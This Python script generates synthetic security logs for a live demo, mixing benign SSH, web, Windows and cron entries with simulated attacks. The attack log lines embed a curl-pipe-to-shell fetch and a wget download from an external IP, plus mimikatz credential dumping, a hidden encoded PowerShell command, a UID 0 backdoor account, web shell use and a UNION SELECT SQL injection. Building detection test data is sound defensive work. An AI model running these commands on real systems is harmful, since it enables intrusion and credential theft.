"""
Demo Dataset Generator
------------------------
Produces a realistic, mixed-format synthetic log corpus (SSH/auth.log, Apache/Nginx,
Sysmon-style Windows text export, JSON) with a normal traffic baseline plus several
embedded attack scenarios (brute force, PowerShell execution, web shell, privilege
escalation, C2 beacon, ransomware, port scan, credential dumping) for live demo.
"""

import json
import random
from datetime import datetime, timedelta

random.seed(7)

HOSTS_LINUX = ["ssh-gateway01", "web-srv01", "db-srv02", "app-srv03"]
HOSTS_WIN = ["WIN-DC01", "WIN-SRV-FIN", "WKS-JDOE07"]
USERS = ["jdoe", "asmith", "root", "admin", "svc_backup", "mreyes"]
EXTERNAL_IPS = ["203.0.113.5", "198.51.100.23", "45.146.164.110", "185.220.101.7"]
INTERNAL_IPS = ["10.0.1.5", "10.0.1.12", "10.0.2.20", "10.0.3.44"]


def _ts(base, offset_minutes):
    return (base + timedelta(minutes=offset_minutes)).strftime("%b %d %H:%M:%S")


def _iso(base, offset_minutes):
    return (base + timedelta(minutes=offset_minutes)).strftime("%Y-%m-%d %H:%M:%S")


def generate_demo_logs():
    base = datetime.now() - timedelta(hours=6)
    lines = []
    t = 0

    # --- Baseline normal traffic -------------------------------------------------
    for i in range(60):
        t += random.randint(1, 4)
        host = random.choice(HOSTS_LINUX)
        user = random.choice(USERS)
        lines.append(f"{_ts(base, t)} {host} sshd[{1000+i}]: Accepted password for {user} from {random.choice(INTERNAL_IPS)} port {40000+i} ssh2")

    for i in range(40):
        t += random.randint(1, 3)
        ip = random.choice(INTERNAL_IPS)
        lines.append(f'{ip} - - [{(base + timedelta(minutes=t)).strftime("%d/%b/%Y:%H:%M:%S +0000")}] "GET /index.html HTTP/1.1" 200 512 "-" "Mozilla/5.0"')

    for i in range(30):
        t += random.randint(1, 3)
        host = random.choice(HOSTS_WIN)
        user = random.choice(USERS)
        lines.append(f'{_iso(base, t)} HOST={host} PROC=explorer.exe PID={2000+i} CMD="explorer.exe" USER={user}')

    for i in range(20):
        t += random.randint(1, 3)
        obj = {"timestamp": _iso(base, t), "host": random.choice(HOSTS_LINUX), "process": "cron",
               "message": "CMD (/usr/local/bin/backup.sh)", "user": "svc_backup"}
        lines.append(json.dumps(obj))

    # --- Scenario 1: SSH brute force against ssh-gateway01 -----------------------
    t += 5
    attacker_ip = EXTERNAL_IPS[0]
    for i in range(18):
        t += 1
        user = random.choice(["admin", "root", "test", "oracle", "postgres"])
        lines.append(f"{_ts(base, t)} ssh-gateway01 sshd[{5000+i}]: Failed password for invalid user {user} from {attacker_ip} port {33000+i} ssh2")
    t += 1
    lines.append(f"{_ts(base, t)} ssh-gateway01 sshd[5100]: Accepted password for root from {attacker_ip} port 33100 ssh2")

    # --- Scenario 2: Privilege escalation + rogue account after breach ----------
    t += 2
    lines.append(f"{_ts(base, t)} ssh-gateway01 sudo: root : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/bin/bash")
    t += 1
    lines.append(f"{_ts(base, t)} ssh-gateway01 useradd[5200]: new user added: name=backdoor_svc, UID=0, GID=0, home=/root")

    # --- Scenario 3: PowerShell encoded command on domain controller ------------
    t += 10
    lines.append(f'{_iso(base, t)} HOST=WIN-DC01 PROC=powershell.exe PID=4521 CMD="powershell.exe -nop -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdA==" USER=SYSTEM')
    t += 1
    lines.append(f'{_iso(base, t)} HOST=WIN-DC01 PROC=lsass.exe PID=612 CMD="mimikatz.exe sekurlsa::logonpasswords" USER=SYSTEM')
    t += 1
    lines.append(f'{_iso(base, t)} HOST=WIN-DC01 PROC=cmd.exe PID=4530 CMD="netsh advfirewall set allstates state off" USER=SYSTEM')

    # --- Scenario 4: Web shell upload + SQLi against web-srv01 -------------------
    t += 4
    lines.append(f'{EXTERNAL_IPS[1]} - - [{(base + timedelta(minutes=t)).strftime("%d/%b/%Y:%H:%M:%S +0000")}] "POST /uploads/shell.php HTTP/1.1" 200 88 "-" "python-requests/2.31"')
    t += 1
    lines.append(f'{EXTERNAL_IPS[1]} - - [{(base + timedelta(minutes=t)).strftime("%d/%b/%Y:%H:%M:%S +0000")}] "GET /shell.php?cmd=id HTTP/1.1" 200 40 "-" "python-requests/2.31"')
    t += 1
    lines.append(f'{EXTERNAL_IPS[1]} - - [{(base + timedelta(minutes=t)).strftime("%d/%b/%Y:%H:%M:%S +0000")}] "GET /product.php?id=1 UNION SELECT username,password FROM users-- HTTP/1.1" 200 210 "-" "sqlmap/1.7"')

    # --- Scenario 5: Reconnaissance / port scan -----------------------------------
    t += 6
    lines.append(f"{_ts(base, t)} db-srv02 kernel: [SYN scan detected] nmap probe from {EXTERNAL_IPS[2]} targeting ports 22,80,443,3306")

    # --- Scenario 6: C2 beacon + ingress tool transfer -----------------------------
    t += 5
    lines.append(f"{_ts(base, t)} app-srv03 bash: curl -s http://{EXTERNAL_IPS[3]}/payload.sh | sh")
    t += 1
    lines.append(f"{_ts(base, t)} app-srv03 bash: wget http://{EXTERNAL_IPS[3]}/agent.elf -O /tmp/.agent.elf")
    t += 1
    lines.append(f"{_ts(base, t)} app-srv03 beacon: outbound beacon to /c2/checkin established, interval=60s")

    # --- Scenario 7: Lateral movement -----------------------------------------------
    t += 3
    lines.append(f"{_ts(base, t)} app-srv03 sshd[6100]: scp report.csv jdoe@10.0.2.20:/tmp/ ssh -o StrictHostKeyChecking=no")

    # --- Scenario 8: Ransomware impact ------------------------------------------------
    t += 15
    lines.append(f"{_ts(base, t)} db-srv02 filemon: file write detected: /data/backups/finance_q1.xlsx.locked")
    t += 1
    lines.append(f"{_ts(base, t)} db-srv02 filemon: new file created: /data/README_TO_DECRYPT.txt - 'your files have been encrypted'")

    # --- A bit more benign noise at the tail --------------------------------------
    for i in range(15):
        t += random.randint(1, 3)
        host = random.choice(HOSTS_LINUX)
        lines.append(f"{_ts(base, t)} {host} systemd[1]: Started Session {100+i} of user root.")

    random.shuffle(lines)  # interleave, but keep enough order via timestamps already embedded
    return "\n".join(lines)
